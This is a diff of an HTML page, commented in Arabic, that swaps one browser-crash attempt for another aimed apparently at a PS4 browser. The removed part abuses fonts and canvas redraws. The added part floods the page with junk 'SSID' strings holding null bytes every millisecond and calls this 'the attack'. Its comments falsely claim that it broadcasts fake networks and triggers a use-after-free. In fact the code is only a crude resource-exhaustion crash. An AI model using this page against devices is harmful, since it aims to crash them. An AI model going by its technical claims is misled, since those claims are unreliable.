@@ -1,40 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style>
-        /* 1. نقوم بتعريف خط وهمي ونعطيه مساراً غير موجود */
-        @font-face {
-            font-family: 'ExploitFont';
-            src: url('non_existent_font.ttf');
-        }
-
-        /* 2. نطبق خصائص غريبة جداً تجبر النظام على حسابات معقدة */
-        .crash-text {
-            font-family: 'ExploitFont', sans-serif;
-            font-size: 1000px; /* حجم ضخم جداً */
-            letter-spacing: 0xFFFFFFFF; /* مسافات غير منطقية */
-            text-shadow: 100px 100px 100px red;
-        }
-    </style>
+    <title>PS4 Network Stress Test</title>
 </head>
-<body onload="trigger()">
-    <div id="target" class="crash-text">TESTING SYSTEM...</div>
+<body style="background-color: black; color: white; text-align: center;">
+    <h1>INITIALIZING NETWORK FUZZING...</h1>
+    <div id="log">Waiting for trigger...</div>
 
     <script>
-        function trigger() {
-            let target = document.getElementById('target');
+        function network_fuzz() {
+            let log = document.getElementById('log');
+            let malicious_ssids = [];
             
-            // 3. تكرار تغيير محتوى النص بسرعة لإجبار المحرك على إعادة الرسم (Re-rendering)
+            // إنشاء 1000 اسم شبكة وهمي بطول هائل
+            for (let i = 0; i < 1000; i++) {
+                // نستخدم حروفاً خاصة و Null Bytes (\x00) لإرباك النظام
+                malicious_ssids.push("SSID_EXPL_" + "A".repeat(500) + "\x00\xff");
+            }
+
+            log.innerHTML = "Broadcasting fake SSIDs in memory...";
+
+            // محاولة إجبار المتصفح على معالجة هذه الأسماء كأنها شبكات مكتشفة
             setInterval(() => {
-                target.innerHTML = Math.random().toString(36);
+                let dummy = document.createElement('div');
+                // نضع الأسماء الطويلة داخل سمات (Attributes) مخفية
+                dummy.setAttribute('data-ssid', malicious_ssids[Math.floor(Math.random() * 1000)]);
+                document.body.appendChild(dummy);
                 
-                // محاولة إحداث Overflow أثناء الرسم
-                let canvas = document.createElement('canvas');
-                let ctx = canvas.getContext('2d');
-                ctx.font = "1000px ExploitFont";
-                ctx.fillText("CRASHING...", 10, 50);
-            }, 10);
+                // تنظيف الذاكرة بشكل خاطئ لإحداث Use-After-Free
+                if (document.body.childNodes.length > 100) {
+                    document.body.removeChild(document.body.firstChild);
+                }
+            }, 1);
         }
+
+        // بدء الهجوم بعد 3 ثوانٍ من تحميل الصفحة
+        setTimeout(network_fuzz, 3000);
     </script>
 </body>
 </html>
